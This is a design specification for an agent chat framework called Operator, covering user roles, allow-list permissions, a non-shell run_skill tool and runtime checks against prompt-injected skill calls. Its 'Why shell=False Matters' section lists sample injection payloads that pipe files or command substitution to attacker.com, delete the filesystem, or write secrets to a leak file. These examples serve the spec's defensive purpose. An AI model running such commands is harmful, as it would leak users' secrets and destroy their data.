# Operator: Users, Permissions & Skill Access

Spec covering user authentication, role-based agent access, simplified permissions, and secure skill execution. Assumes fresh installs — no migrations, no backward compatibility.

---

## 1. Users & Identity

### Schema

```sql
CREATE TABLE users (
    username TEXT PRIMARY KEY,
    created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE user_identities (
    platform_id TEXT PRIMARY KEY,   -- "slack:U04ABC123", "telegram:12345678"
    username TEXT NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
);

CREATE TABLE user_roles (
    username TEXT NOT NULL,
    role TEXT NOT NULL,
    PRIMARY KEY (username, role),
    FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
);
```

- `username` — lowercase, unique, human-readable. The stable identity across the system. Examples: `gavin`, `shawn`, `gavin.vickery`.
- `platform_id` — transport-specific identifier. Matches the existing `IncomingMessage.user_id` format (e.g. `slack:U04ABC123`). Multiple platform IDs can map to the same username.
- No `display_name` column. Display names are resolved at runtime from transport APIs (Slack `users.info`, etc.) and cached in memory. No stale copies in the DB.

### Username Rules

- Lowercase alphanumeric, dots, and hyphens. No spaces.
- 1-64 characters.
- Must be unique.
- Validated on creation (CLI and tool).

---

## 2. Roles

### The `admin` Role

`admin` is hardcoded. It is not defined in config. It always grants:

- `agents: "*"` — access to all agents.
- Access to role-gated tools (see section 6).

If someone defines `admin` in the config `roles` block, it is a validation error.

### Config-defined Roles

All other roles are defined in `operator.yaml` and map to agent access:

```yaml
roles:
  team:
    agents: [operator, researcher]
  viewer:
    agents: [researcher]
```

- `agents` is a list of agent names the role can message.
- Roles are purely about agent routing. They do not control tool or skill access (that's agent permissions).
- A user assigned a role that doesn't exist in config gets no agent access from that role. The system warns at startup if a user has roles not present in config.
- Update `operator init` to include empty "guest" role by default.

### Role Resolution

A user can have multiple roles. Allowed agents are the union of all role agent lists. If any role is `admin`, the user has access to all agents.

---

## 3. Auth Flow

Auth is always on. Every inbound message is checked. There is no toggle.

Auth applies to **inbound transport messages only**. Jobs run via `JobRunner` with no user — they are system-initiated and bypass auth entirely. The `UserContext` context var is not set during job runs. Code that reads `UserContext` must handle its absence (role-gated tools return an error, memory tools skip user scope).

### Inbound Message Check

Inserted in the dispatcher (`Dispatcher.handle_message`), between receiving a message and routing to the agent:

```
on_message(msg):
    username = store.resolve_username(msg.user_id)  # "slack:U04ABC123" -> "gavin"

    if not username:
        handle_rejection(msg)
        return

    roles = store.get_user_roles(username)
    allowed_agents = resolve_allowed_agents(roles, config.roles)

    if target_agent not in allowed_agents:
        handle_rejection(msg)
        return

    set_user_context(username=username, roles=roles)
    proceed with dispatch
```

### Rejection Behavior

Controlled by a setting:

```yaml
settings:
  reject_response: announce   # "announce" or "ignore"
```

- `announce` — reply with a short message: "You don't have access to this agent."
- `ignore` — silently drop the message. No response.

Default: `ignore`.

### Empty Users Table

If no users exist in the DB, all messages are rejected. The log emits a warning:

```
No users configured. Run: operator user add <username> --role admin <transport> <id>
```

No special "allow all" fallback.

---

## 4. Agent Permissions (Simplified)

Drop `allow`/`deny` nesting entirely. Permissions are flat allow-lists or `"*"`.

### Config Format

```yaml
agents:
  operator:
    transport: { ... }
    permissions:
      tools: "*"
      skills: "*"

  researcher:
    transport: { ... }
    permissions:
      tools: [read_file, list_files, web_fetch, read_skill, run_skill, send_message, search_memories]
      skills: [summarize, translate]
```

### Resolution

- No `permissions` block = full access (same as `"*"`).
- `"*"` = explicit full access.
- `[list]` = only these names. Everything else is hidden from the LLM.
- No `deny` lists. Allow-only.

### Config Model Change

Replace `ToolPermissions` and `SkillPermissions` (with `allow`/`deny` fields) with flat values on `PermissionsConfig`:

```python
class PermissionsConfig(BaseModel):
    tools: list[str] | Literal["*"] | None = None  # None = no block = full access
    skills: list[str] | Literal["*"] | None = None
```

The `agent_tool_filter` and `agent_skill_filter` methods simplify accordingly — return `None` for unrestricted, or a set-membership check for lists.

---

## 5. Skill Access Tools

Two new built-in tools for agents to interact with skills without needing `run_shell` or `read_file`.

### Skill Permission Enforcement

Skills are gated at two levels:

1. **Prompt assembly** — only skills in the agent's `permissions.skills` list are injected into the system prompt. The agent never sees skills it doesn't have access to. This already works via `agent_skill_filter` in `prompts/__init__.py`.

2. **Runtime validation** — `read_skill` and `run_skill` check the skill name against the agent's allowed skills before executing. Even if the agent is tricked (via prompt injection or a creative user) into calling a skill by name that isn't in its list, the tool rejects it: `[error: skill 'deploy' is not available to this agent]`.

The skill filter must be accessible at tool execution time. Pass it via the tool context (same `contextvars` pattern as workspace and user context).

### `read_skill`

Read skill content. Used for progressive disclosure — the agent reads SKILL.md to understand a skill, then reads references or assets as needed.

```
Tool: read_skill
Parameters:
  skill: str (required) — skill name, must be in agent's allowed skills
  path: str (optional) — relative path within the skill directory

Behavior:
  - skill only -> returns full SKILL.md content
  - skill + path -> returns content of the specified file
    e.g. path="scripts/extract.py", path="references/schema.md"
  - Paths resolve relative to ~/.operator/skills/<skill>/
  - Path traversal blocked: no ".." components allowed
  - Agent can only read skills it has permission to use
  - Runtime check: skill name validated against agent's skill permissions
```

### `run_skill`

Execute a command in the context of a skill. This is the controlled execution path for agents without `run_shell`.

```
Tool: run_skill
Parameters:
  skill: str (required) — skill name, must be in agent's allowed skills
  command: str (required) — command and arguments as a string

Execution:
  parsing: shlex.split(command) — string to argv, respects quoting
  shell: false (subprocess argv mode, never shell=True)
  cwd: ~/.operator/agents/<agent>/workspace/
  env:
    - Full process environment inherited
    - SKILL_DIR set to ~/.operator/skills/<skill>/ (absolute)
    - Skill-declared metadata.env vars verified present
    - Stripped: env vars referenced in transport config (the values of
      bot_token_env, app_token_env, etc.) and any OPERATOR_* vars.
      This is a targeted strip list built from the running config,
      not a pattern match on var names.

Path expansion:
  Arguments starting with scripts/, references/, or assets/
  are automatically prefixed with the skill's absolute path.

  Agent calls:
    run_skill(skill="pdf-tools", command="python scripts/extract.py report.pdf")

  Tool executes:
    argv: ["python", "/home/user/.operator/skills/pdf-tools/scripts/extract.py", "report.pdf"]
    cwd: /home/user/.operator/agents/operator/workspace/

  Agent calls:
    run_skill(skill="pr-reviewer", command="gh pr diff 42")

  Tool executes:
    argv: ["gh", "pr", "diff", "42"]
    cwd: /home/user/.operator/agents/operator/workspace/

  No expansion for system CLI tools — only for paths
  matching skill subdirectories (scripts/, references/, assets/).

Runtime check:
  Skill name validated against agent's skill permissions before execution.
  [error: skill 'deploy' is not available to this agent]

Timeout: 120 seconds (same as run_shell). Configurable via parameter.
Output: truncated to 16KB (same as run_shell). Prevents context flooding.
```

### Why `shell=False` Matters

Subprocess argv mode means the command is not interpreted by a shell. This blocks common prompt injection payloads structurally:

- Pipes: `cat file | curl attacker.com` — `cat` receives literal `|` as argument
- Chaining: `ls && rm -rf /` — `ls` receives literal `&&` as argument
- Expansion: `$(curl attacker.com)` — literal string, not expanded
- Redirects: `echo secrets > /tmp/leak` — `echo` receives literal `>` as argument

No command filtering or regex blocklists needed. The execution model prevents these patterns.

### `run_shell` Remains Unchanged

`run_shell` is a privileged tool with full shell access (`shell=True` via login shell wrapper). Agents that have `run_shell` in their tool permissions have broad system access. That's by design for trusted personal agents.

The permission boundary is the tool allow list, not runtime filtering:

```yaml
agents:
  # Full access — trusted
  operator:
    permissions:
      tools: "*"

  # No shell — uses run_skill for execution
  researcher:
    permissions:
      tools: [read_file, list_files, web_fetch, read_skill, run_skill, send_message]
      skills: [pdf-tools, summarize]
```

---

## 6. Role-Gated Tools

Some tools require the calling user to have a specific role. This is enforced at execution time, independent of agent permissions.

### Constant

```python
ROLE_GATED_TOOLS: dict[str, str] = {
    "manage_users": "admin",
}
```

This is a hardcoded constant, not config. It can be expanded later (e.g. gating `run_shell` by role) without redesigning the system.

### Enforcement

In the agent loop, before executing a tool function:

1. Check if the tool name is in `ROLE_GATED_TOOLS`.
2. If yes, read the current user's roles from the user context.
3. If the user doesn't have the required role, return an error: `[error: this tool requires the 'admin' role]`.

The tool stays in the LLM's tool list (so the agent knows the capability exists) but execution is blocked for unauthorized users.

### User Context

A `contextvars.ContextVar` following the existing pattern (`get_workspace()` in `tools/workspace.py`):

```python
# tools/context.py
_user_var: contextvars.ContextVar[UserContext] = contextvars.ContextVar("user_context")

@dataclass
class UserContext:
    username: str
    roles: list[str]
```

Set by the dispatcher before `run_agent()`. Read by the role gate check in the agent loop and by `manage_users` tool implementation.

**Not set during job runs.** Code reading this var must handle `LookupError` (context var not set) — role-gated tools return an error, memory tools skip user scope.

**Sub-agents inherit user context.** `spawn_agent` passes the current `UserContext` through so role-gated tools work consistently in sub-agent runs. Thread it via `subagent.configure()` alongside the existing tool filter.

---

## 7. `manage_users` Tool

Allows admin users to manage users through chat. Gated by the `admin` role (see section 6).

```
Tool: manage_users
Actions: list, add, remove, link, unlink, add_role, remove_role

Parameters:
  action: str (required)
  username: str (required for add/remove/link/unlink/add_role/remove_role)
  role: str (required for add/add_role/remove_role)
  transport: str (required for link/unlink) — e.g. "slack", "telegram"
  external_id: str (required for link/unlink) — platform user ID
```

Actions:

- `list` — show all users with their identities and roles.
- `add` — create a user with a role. Does not add an identity (use `link` for that).
- `remove` — delete a user and all their identities and roles (cascade).
- `link` — add a platform identity to an existing user.
- `unlink` — remove a platform identity from a user.
- `add_role` — add a role to an existing user.
- `remove_role` — remove a role from a user.

---

## 8. CLI

### `operator tools`

Lists all registered built-in tools. Helps users setting up agent permissions see what's available.

```sh
operator tools
```

Output: table with tool name and description. Example:

```
Tool              Description
run_shell         Execute a shell command and return its output...
read_file         Read a file from the agent's workspace...
write_file        Write content to a file in the agent's workspace...
read_skill        Read skill content (SKILL.md, references, assets)...
run_skill         Execute a command in the context of a skill...
manage_users      Manage users, identities, and roles...
...
```

This reads from the tool registry (`tools/registry.py:get_tools()`). Shows built-in tools only — transport-specific tools (e.g. `list_channels`, `read_channel`, `read_thread`) are registered at runtime by the running transport and are not available at CLI time. The output should note this: "Transports may provide additional tools at runtime."

Users copy tool names from this list into `permissions.tools` in config. `operator skills` already exists and shows available skills. Together these two commands give the user everything they need to configure permissions.

### `operator user`

Command-line management for bootstrap and administration.

```sh
# Create user with first identity and role
operator user add <username> --role <role> <transport> <external_id>

# Link another transport identity to existing user
operator user link <username> <transport> <external_id>

# Remove a transport identity
operator user unlink <username> <transport> <external_id>

# Remove a user entirely (cascades identities and roles)
operator user remove <username>

# List all users with identities and roles
operator user list

# Show details for one user
operator user info <username>

# Add/remove roles
operator user add-role <username> <role>
operator user remove-role <username> <role>
```

- `--role` is required on `add`. No default role.
- `add` creates the user, assigns the role, and links the identity in one command.
- If the role is not `admin` and not in config, warn but allow (config may be updated later).

### Examples

```sh
# Bootstrap: first admin
operator user add gavin --role admin slack U04ABC123

# Add Telegram identity to same user
operator user link gavin telegram 12345678

# Add team member
operator user add shawn --role team slack U07XYZ789

# Inspect
operator user list
operator user info gavin
```

---

## 9. Memory Scopes Use Username

Currently memory scopes use the platform-specific `user_id` (`slack:U04ABC123`). This changes to `username`.

### Before

```python
# In dispatcher
scopes = [("user", msg.user_id), ("agent", agent_name), ("global", "global")]

# In memory tools
scope_id = {"user": user_id, "agent": agent_name, "global": "global"}[scope]
# where user_id = "slack:U04ABC123"
```

### After

```python
# In dispatcher
scopes = [("user", username), ("agent", agent_name), ("global", "global")]

# In memory tools
scope_id = {"user": username, "agent": agent_name, "global": "global"}[scope]
# where username = "gavin"
```

This means user memories persist across transports. If Gavin talks to an agent on Slack and it learns a preference, that memory is available when Gavin talks on Telegram.

The memory tool context config changes from `"user_id": msg.user_id` to `"user_id": username` (the key name stays for minimal churn in the tools).

---

## 10. System Prompt Context

The `MessageContext.to_prompt()` output updates to include the username:

```
# Context

- Platform: slack
- Channel: #general (`C04ABC123`)
- User: gavin (Gavin Vickery via slack)
- Workspace: `~/.operator/agents/operator/workspace`
```

`MessageContext` gains a `username` field (default `""`). The transport's `resolve_context()` creates `MessageContext` without the username (it doesn't have store access). The dispatcher sets `ctx.username` after the auth lookup resolves `platform_id -> username`. The display name is still resolved from the transport API. The format gives the agent both the stable identifier and the human name.

---

## 11. Conversations — No Changes

Conversation IDs are already transport-isolated:

```
slack:operator:C04ABC123:1709123456.789
telegram:operator:chat12345:msg789
```

The `platform_message_index` is keyed by `(transport_name, platform_message_id)`. Each transport manages its own message sessions by its own IDs. A Slack DM and a Telegram DM to the same agent are separate conversations.

No changes needed to the conversation or message tables.

---

## 12. Store Functions

New functions in `store.py`:

```python
# Users
create_user_tables()                                    # called during DB init
add_user(username: str) -> None
remove_user(username: str) -> bool
get_user(username: str) -> User | None
list_users() -> list[User]

# Identities
add_identity(username: str, platform_id: str) -> None
remove_identity(platform_id: str) -> bool
resolve_username(platform_id: str) -> str | None        # the hot-path auth lookup

# Roles
add_role(username: str, role: str) -> None
remove_role(username: str, role: str) -> bool
get_user_roles(username: str) -> list[str]
```

`User` is a dataclass: `username, created_at, identities: list[str], roles: list[str]`.

`resolve_username` is called on every inbound message. It should be fast — single index lookup on `user_identities.platform_id`.

---

## 13. Config Changes Summary

### New

```yaml
roles:
  team:
    agents: [operator, researcher]
  viewer:
    agents: [researcher]

settings:
  reject_response: ignore   # "announce" or "ignore"
```

### Changed

```yaml
# Before
agents:
  researcher:
    permissions:
      tools:
        allow: [read_file, web_fetch]
      skills:
        deny: [deploy]

# After
agents:
  researcher:
    permissions:
      tools: [read_file, web_fetch, read_skill, run_skill]
      skills: [summarize]
```

### Config Models

Remove `ToolPermissions` and `SkillPermissions` classes. Replace with:

```python
class PermissionsConfig(BaseModel):
    tools: list[str] | Literal["*"] | None = None
    skills: list[str] | Literal["*"] | None = None

class RoleConfig(BaseModel):
    agents: list[str]

class SettingsConfig(BaseModel):
    show_usage: bool = False
    reject_response: Literal["announce", "ignore"] = "ignore"

class Config(BaseModel):
    defaults: DefaultsConfig
    agents: dict[str, AgentConfig]
    roles: dict[str, RoleConfig] = Field(default_factory=dict)
    memory: MemoryConfig
    settings: SettingsConfig
```

Validation: if `"admin"` appears as a key in `roles`, raise a config error ("admin is a built-in role and cannot be redefined").

---

## 14. What Not to Build

- **Shell command filtering or regex blocklists** — `shell=False` in `run_skill` makes these redundant.
- **Path traversal detection in `run_skill`** — argv mode doesn't interpret paths as shell. The cwd is fixed to workspace.
- **Docker/chroot/seccomp sandboxing** — overkill for the threat model. The attacker is a confused LLM, not a hostile user.
- **`run_shell` restrictions** — if an agent has it, it has full shell. The boundary is the tool allow list.
- **`web_fetch` domain allowlists** — security through agent isolation (restricted agents don't get `web_fetch` + sensitive skills together). Revisit later if needed.
- **`send_message` reply-only mode** — same reasoning. Agent isolation handles this.
- **`!users` bang command** — CLI and `manage_users` tool are sufficient.
- **Backward compatibility shims** — no `allow`/`deny` migration, no `require_auth` toggle. Clean break.
- **`requires_tools` on skill metadata** — skills follow agentskills.io spec as-is. No proprietary fields.

---

## 15. `operator init` Updates

The starter config scaffold adds the `roles` block and `reject_response` setting:

```yaml
# Operator configuration

defaults:
  models:
    - "anthropic/claude-sonnet-4-6"
  max_iterations: 25
  context_ratio: 0.5
  # timezone: "America/Vancouver"
  # env_file: "~/.env"

agents:
  operator:
    transport:
      type: slack
      bot_token_env: SLACK_BOT_TOKEN
      app_token_env: SLACK_APP_TOKEN

roles:
  guest:
    agents: []

settings:
  reject_response: ignore   # "announce" or "ignore"
```

The `guest` role ships with an empty agents list — a scaffolding starting point so users don't need to look up the format. They can add agents to it or define new roles as needed.

Post-init instructions should remind the user to add themselves:

```
Operator initialized at ~/.operator
Edit operator.yaml to configure your agents and transports.
Add yourself: operator user add <username> --role admin <transport> <id>
```

---

## 16. Implementation Scope

### New Files

| File | Purpose |
|---|---|
| `tools/skills_access.py` | `read_skill` and `run_skill` tool implementations |
| `tools/users.py` | `manage_users` tool |
| `tools/context.py` | `UserContext` dataclass, skill filter, and context vars |

### Modified Files

| File | Changes |
|---|---|
| `config.py` | Replace `ToolPermissions`/`SkillPermissions` with flat `PermissionsConfig`. Add `RoleConfig`. Add `reject_response` to `SettingsConfig`. Add config validation for `admin` role name. |
| `store.py` | Add user/identity/role tables in DB init. Add store functions (section 12). Remove old migration code. |
| `main.py` | Add auth check in `Dispatcher.handle_message`. Resolve `platform_id -> username`. Set `UserContext`. Pass `username` to memory scopes and tool configs. Pass skill filter to tool context. |
| `transport/base.py` | Add `username` field to `MessageContext`. Update `to_prompt()`. |
| `agent.py` | Add role-gate check before tool execution using `ROLE_GATED_TOOLS`. |
| `tools/__init__.py` | Register new tool modules (`skills_access`, `users`, `context`). |
| `tools/memory.py` | No code changes — receives `username` via context instead of platform ID (set by dispatcher). |
| `prompts/__init__.py` | No changes to assembly logic. Skills prompt and tool filtering work as before. |
| `skills.py` | No changes. `build_skills_prompt` continues showing location paths. `read_skill` replaces direct file access for restricted agents. |
| `cli.py` | Add `operator user` subcommand group. Add `operator tools` command. Update `operator init` starter config and post-init message. |
